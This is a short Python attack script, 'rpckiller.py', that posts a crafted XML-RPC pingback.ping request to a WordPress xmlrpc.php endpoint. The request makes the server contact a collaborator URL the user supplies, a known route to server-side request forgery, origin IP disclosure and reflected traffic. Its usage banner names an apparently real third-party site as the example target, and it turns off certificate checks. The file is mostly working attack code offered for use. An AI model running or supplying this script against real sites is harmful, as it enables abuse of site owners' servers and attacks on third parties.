#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import sys
import logging
from urllib.parse import urlsplit
logging.basicConfig(level=logging.DEBUG)
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
print ("""

                               /$$       /$$ /$$ /$$                    
                              | $$      |__/| $$| $$                    
  /$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$ /$$| $$| $$  /$$$$$$   /$$$$$$ 
 /$$__  $$ /$$__  $$ /$$_____/| $$  /$$/| $$| $$| $$ /$$__  $$ /$$__  $$
| $$  \__/| $$  \ $$| $$      | $$$$$$/ | $$| $$| $$| $$$$$$$$| $$  \__/
| $$      | $$  | $$| $$      | $$_  $$ | $$| $$| $$| $$_____/| $$      
| $$      | $$$$$$$/|  $$$$$$$| $$ \  $$| $$| $$| $$|  $$$$$$$| $$      
|__/      | $$____/  \_______/|__/  \__/|__/|__/|__/ \_______/|__/      
          | $$                                                          
          | $$                                                          
          |__/                                                          

                                            coded by @D0rkerDevil
USAGE - rpckiller.py https://www.ypfbchaco.com.bo/xmlrpc.php http://localhost:8080 http://localhost/2023/06/08/prueba-del-sitio/'
""")

proxies = {
  "http": "http://127.0.0.1:8083",
  "https": "http://127.0.0.1:8083",
} 
#defining a main function with 3 arguments 
def main(): 
    target = sys.argv[1]
    collab = sys.argv[2]
    pingback_url = sys.argv[3]
    if len(sys.argv) >= 3:  #argument condition 
        try:
            base_url = \
                '{0.scheme}://{0.netloc}/'.format(urlsplit(target)) #seperates the protocol and domain from the input.
            target_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'close',
                }
            
            print(f'pingback_url {pingback_url}')
            print(f'collab {collab}')
            target_data = '''<?xml version="1.0" encoding="UTF-8"?>\r
<methodCall>\r
<methodName>pingback.ping</methodName>\r
<params>\r
<param>\r
<value>\r
<string>''' \
                + collab \
                + '''\r
</string></value>\r
</param>\r
<param>\r
<value>\r
<string>''' \
                + pingback_url \
                + '''</string></value>\r
</param>\r
</params>\r
</methodCall>'''
            r = requests.post(target, headers=target_headers,
                              data=target_data, timeout=None,
                              verify=False)
            if r.status_code == 200:
                print (r.content)                
        except Exception as error:
            print ('Idiot!!!!')


if __name__ == '__main__':
    main()
